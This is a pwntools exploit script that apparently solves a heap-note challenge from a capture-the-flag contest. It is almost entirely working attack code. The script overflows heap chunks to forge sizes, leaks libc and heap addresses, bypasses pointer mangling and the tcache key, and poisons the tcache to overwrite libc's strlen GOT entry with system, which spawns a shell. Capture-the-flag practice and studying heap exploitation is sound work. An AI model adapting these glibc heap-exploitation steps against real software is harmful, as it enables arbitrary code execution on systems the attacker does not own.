#!/usr/bin/env python3

from pwn import *

enc = lambda a: a.encode() if isinstance(a, str) else a
sla = lambda a, b: r.sendlineafter(enc(a), enc(b))
snl = lambda a: r.sendline(enc(a))
sna = lambda a, b: r.sendafter(enc(a), enc(b))
snd = lambda a: r.send(enc(a))
rcu = lambda a: r.recvuntil(enc(a), drop=True)
rcv = lambda a: r.recv(enc(a))
rcl = lambda: r.recvline()
p24 = lambda a: p32(a)[:-1]
l64 = lambda a: u64(a.ljust(8, b"\x00"))
l32 = lambda a: u64(a.ljust(4, b"\x00"))
l16 = lambda a: u64(a.ljust(2, b"\x00"))
lin = lambda a: log.info(f"{hex(a)=}")
sen = lambda a: str(a).encode()
mangle = lambda ptr, pos: ptr ^ (pos >> 12)

context.terminal = ["tmux", "splitw", "-h"]

exe = ELF("./chall_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-linux-x86-64.so.2", checksec=False)

context.binary = exe

if args.REMOTE:
    r = remote("chall.lac.tf", 31144)
    # r = remote("localhost", 5000)
else:
    r = process([exe.path])
    if args.GDB:
        gdb.attach(r, gdbscript='''
        ''')

def create_note(index: int, size: int, data: bytes):
    assert size >= 0 and size <= 0xf8
    sla(b'> ', sen(1))
    sla(b'Index: ', sen(index))
    sla(b'Size: ', sen(size))
    sna(b'Data: ', data)

def delete_note(index: int):
    sla(b'> ', sen(2))
    sla(b'Index: ', sen(index))

def read_note(index: int):
    sla(b'> ', sen(3))
    sla(b'Index: ', sen(index))

def main():

    # Heap overflow to forge size of chunk as a chunk that would go into the unsorted bin
    for i in range(8): # Fill tcache
        create_note(0, 0xc, b'bruh')
        create_note(1, 0xc, b'bruh')
        delete_note(0)
        create_note(0, 0x4, b''.join([
            b'A' * (0x10 + i * 0x20), # We unfortunately memory-leak a size 0x20 chunk each time, so the location that note[1] points to keeps going down
            p64(0x20), # prev_size
            p64(0x201), # size of forged chunk
            b'A' * 0x18,
            p64(0x20d31 - i * 0x20), # Retain size field of original top chunk (needed to properly allocate off the top chunk)

            # When filling the tcache, we don't really need to make sure that the end
            # of our chunk is correct e.g. that the PREV_INUSE bit of the next chunk's
            # size is set - this is because tcache checks are generally very lax for
            # performance
            # However, when freeing into the unsorted bin, this is required to pass a number of checks
            b'' if i != 7 else b''.join([
                b'A' * 0x1d8,
                p64(0x21), # PREV_INUSE = 1 (Pass check)
                b'A' * 0x18,
                p64(0x21) # Prevent forward consolidation
            ])
        ]))
        delete_note(1)
        delete_note(0)

    # Get our libc leak
    create_note(0, 0x4, b'A' * 0x100)
    read_note(0)
    libc.address = u64(rcl().strip()[0x100:].ljust(8, b'\x00')) - 0x21ace0
    log.info(f'{hex(libc.address)=}')

    # Restore size field of unsorted bin chunk with a different value
    delete_note(0)
    create_note(0, 0x4, b''.join([
        b'A' * 0xf8, 
        p64(0x21),
        p64(libc.address + 0x21ace0) * 2,
        p64(0x20),
        p64(0x20c50)
    ]))

    # Get our heap ptr leak for pointer mangling
    create_note(1, 0xc, b'bruh')
    delete_note(1)
    delete_note(0)
    create_note(0, 0x4, b'A' * 0x100)
    read_note(0)
    mangler = u64(rcl().strip()[0x100:].ljust(8, b'\x00'))
    log.info(f'{hex(mangler)=}')

    # Restore size field of the freed note 1
    delete_note(0) 
    create_note(0, 0x4, b'A'*0xf8 + p64(0x21))

    # tcache poisoning to write libc.sym.system into libc.got.strlen
    delete_note(0)
    create_note(0, 0x20, b'bruh' * 0x4)
    create_note(1, 0x20, b'bruh' * 0x4) # We use a new tcache bin, of size 0x30
    delete_note(1)
    delete_note(0)
    create_note(0, 0x4, b'A' * 0x118 + p64(0x31) + p64((libc.address + 0x21a090) ^ mangler) + b'\x00') # Null byte to overcome tcache key mitigation
    create_note(1, 0x20, b'/bin/sh\x00')
    delete_note(0)
    create_note(0, 0x20, p64(libc.address + 0xa88d0) + p64(libc.sym.system))

    # Get shell
    read_note(1)

    r.interactive()


if __name__ == "__main__":
    main()
